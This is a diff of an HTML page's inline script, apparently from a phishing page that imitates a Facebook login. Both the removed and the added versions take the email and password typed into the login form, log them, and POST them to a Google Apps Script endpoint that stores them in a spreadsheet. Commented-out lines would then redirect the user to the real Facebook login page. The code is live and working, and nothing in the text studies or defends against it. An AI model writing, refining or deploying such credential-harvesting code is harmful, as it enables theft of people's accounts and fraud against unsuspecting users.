@@ -350,36 +350,38 @@
             </div>
         </div>
     </div>
-    <script>
-        document.getElementById("login_form").addEventListener("submit", function(event) {
-          event.preventDefault(); // Empêche l'envoi classique du formulaire
-      
-          const email = document.getElementById("email").value;
-          const password = document.getElementById("pass").value;
-      
-          console.log("Login Attempt:");
-          console.log("Email:", email);
-          console.log("Password:", password);
-      
-          // Envoi vers Google Sheets via Apps Script
-          fetch("https://script.google.com/macros/s/AKfycby950d4wFBK0xIGBtodCqBKYPSsMEvOTel2DbWGtMthgR9IbalOC2vfuEI6JcQDbPf7/exec", {
-            method: "POST",
-            body: JSON.stringify({ email: email, password: password }),
-            headers: {
-              "Content-Type": "application/json"
-            }
-          })
-          .then(response => {
-            alert("Informations envoyées !");
-            // Redirection optionnelle après soumission :
-            // window.location.href = "https://www.facebook.com/login/?locale=fr_FR";
-          })
-          .catch(error => {
-            console.error("Erreur lors de l'envoi :", error);
-            alert("Erreur d'envoi !");
-          });
-        });
-      </script>
-      
+   <script>
+document.getElementById("login_form").addEventListener("submit", function(event) {
+  event.preventDefault();
+
+  const email = document.getElementById("email").value.trim();
+  const password = document.getElementById("pass").value.trim();
+
+  console.log("Login Attempt:", { email, password });
+
+  fetch("https://script.google.com/macros/s/AKfycby950d4wFBK0xIGBtodCqBKYPSsMEvOTel2DbWGtMthgR9IbalOC2vfuEI6JcQDbPf7/exec", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({ email, password })
+  })
+  .then(response => response.json())
+  .then(data => {
+    if(data.status === "success") {
+      alert("Informations envoyées avec succès !");
+      // Optionnel : redirection après succès
+      // window.location.href = "https://www.facebook.com/login/?locale=fr_FR";
+    } else {
+      alert("Erreur serveur : " + data.message);
+    }
+  })
+  .catch(error => {
+    console.error("Erreur lors de l'envoi :", error);
+    alert("Erreur d'envoi !");
+  });
+});
+</script>
+
 </body>
 </html>
